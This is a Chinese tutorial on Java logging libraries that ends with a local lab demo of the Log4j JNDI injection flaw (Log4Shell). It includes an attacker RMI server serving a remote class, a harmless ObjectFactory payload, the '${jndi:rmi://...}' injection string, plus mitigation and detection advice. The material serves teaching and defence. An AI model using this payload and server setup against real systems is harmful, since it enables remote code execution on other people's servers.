https://www.liaoxuefeng.com/wiki/1252599548343744/1264739436350112

# 概述

Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。



**Logger（记录器）**：有七个级别，只输出级别不低于设定级别的日志信息

**Appender（输出端）**：把日志输出到不同的地方

**Layout（布局）**：格式化 Log 信息的输出



添加依赖包

【slf4j-api】：为 java 提供简单日志接口

【slf4j-log4j12】：连接 slf4j-api 和  log4j 的适配器

【log4j】：具体化的日志系统，通过 slf4j-log4j12 初始化 log4j，达到最终日志的输出

```xml
<slf4j.version>1.7.25</slf4j.version>
<log4j.version>1.2.17</log4j.version>
<!-- log4j2 start -->
<dependency>
    <groupId>log4j</groupId>
    <artifactId>log4j</artifactId>
    <version>${log4j.version}</version>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>${slf4j.version}</version>
</dependency>
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-log4j12</artifactId>
    <version>${slf4j.version}</version>
</dependency>
<!-- log4j2 end -->
```








# Commons Logging

和Java标准库提供的日志不同，Commons Logging是一个第三方日志库，它是由Apache创建的日志模块。

Commons Logging的特色是，它可以挂接不同的日志系统，并通过配置文件指定挂接的日志系统。默认情况下，Commons Loggin自动搜索并使用Log4j（Log4j是另一个流行的日志系统），如果没有找到Log4j，再使用JDK Logging。



第一步，通过`LogFactory`获取`Log`类的实例； 第二步，使用`Log`实例的方法打日志。

```java
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;

Log log = LogFactory.getLog(getClass());
log.info("start...");
log.warn("end.");
```





Commons Logging定义了6个日志级别：

- FATAL
- ERROR
- WARNING
- INFO
- DEBUG
- TRACE

默认级别是`INFO`。





# JNDI注入漏洞

> 没有jndi之前，对于一个外部依赖，像mysql数据库，程序开发的过程中需要将具体的数据库地址参数写入到java代码中，程序才能找到具体的数据库地址进行链接。那么数据库配置这些信息可能经常变动的。这就需要开发经常手动去调整配置。
> 有了jndi后，程序员可以不去管数据库相关的配置信息，这些配置都交给J2EE容器来配置和管理，程序员只要对这些配置和管理进行引用即可。其实就是给资源起个名字，再根据名字来找资源。
> 当一个需要被获取的对象的名称可以被远程控制的时候，黑客可以将被攻击的java客户端的jndi请求指向恶意的服务地址，恶意的资源服务地址响应了恶意的java对象，这个对象是“javax.naming.Reference" 的示例，JNDI客户端客户端会尝试解析该对象的classFactory和classFactoryLocation属性。如果这classFactory属性是未知的，那么java会使用URLClassLoade从classFactoryLocation处获取字节码。
> 就是这么简单的机制，‘initialContext.lookup‘方法即使没有直接暴露在污点数据中，我们可以利用它进行漏洞利用。
>

也就是说JNDI可以访问远端的服务器，所以攻击者让被攻击者的电脑或者服务器来访问远端的服务器，达到控制被攻击者的电脑和服务器的目的（比如控制你的服务器资源去挖矿，获取你数据库里面重要信息等等）

Login.java(代表受害者的服务器）

```JAVA
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Login {
    private static Logger logger= LogManager.getLogger(Login.class);
    //一个简单的登录方法，传入用户名字
    public void register(String username){
    	//日志在控制台打印
        logger.info("{},在何时登录",username);
    }
}
```

Remote.java(代表攻击者部署）

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;

public class Remote{
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        //启动一个jndi服务器
        Reference reference = new Reference("com.itheima.remote.Attack", "com.itheima.remote.Attack", "http://127.0.0.1:8081/");
        //创建一个资源
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/remote'");
        //给资源命名，绑定
        registry.bind("remote", refObjWrapper);
    }
}
```

Attack.java(这里是攻击者要攻击的具体内容的实现）

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Attack implements ObjectFactory {
    static {
        System.out.println("静态代码块攻击");
    }
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("你被攻击了");
        return "【攻击者】";
    }
}
```

我们通过静态代码块，强制执行里面的内容。

我们先运行Remote.java,这个文件，在控制台获取一个和资源名绑定的一个路径，如下
![在这里插入图片描述](http://mdimg.sofice.top/202112221544857.png)

testJndi.java（启动一下受害者的服务器，并且进行jndi注入攻击）

```java
import com.itheima.local.Login;
import org.junit.Test;

public class testJndi {
    @Test
    public void test1(){
    	String uri="${jndi:rmi://127.0.0.1:1099/remote}";
        Login login=new Login();
        //故意把错误用户名给他
        login.register(uri);
    }
}
```

于是我们就发现控制台竟然执行了攻击者的代码，输出了静态代码块的功能

![在这里插入图片描述](http://mdimg.sofice.top/202112221544762.png)

而且在这里，前端界面和后端都会判定填写的用户名字正确，因为用户名字的确是一串字符串，系统并不会阻拦。

但是这个条数据不仅仅和后端数据库进行交互而且还和log4j这个日志信息模块进行交互，log4在自己的服务器里面执行了远程服务器里面的代码。这里面有非常大的信息网络安全隐患，你的服务器再也不是属于你自己的了，任何一个懂得jndi注入技术的人都能控制你的电脑或者服务器

## 解决方案

更换项目依赖版本>=2.15.0

资源文件路径会安全转行为字符串形式

**日志/流量排查**

- 排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字。
  
- 排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。

**临时修补建议**

- 设置JVM启动参数-Dlog4j2.formatMsgNoLookups=true。
  
- 尽量使用JDK 版本大于11.0.1、8u191、7u201、6u211，需要注意的是，即使是使用了 JDK 高版本也不能完全保证安全，依然存在本地绕过的情况。
  
- 限制不必要的业务访问外网。
  
- 采用 rasp 对lookup的调用进行阻断。
  
- 采用 waf 对请求流量中的${jndi进行拦截。
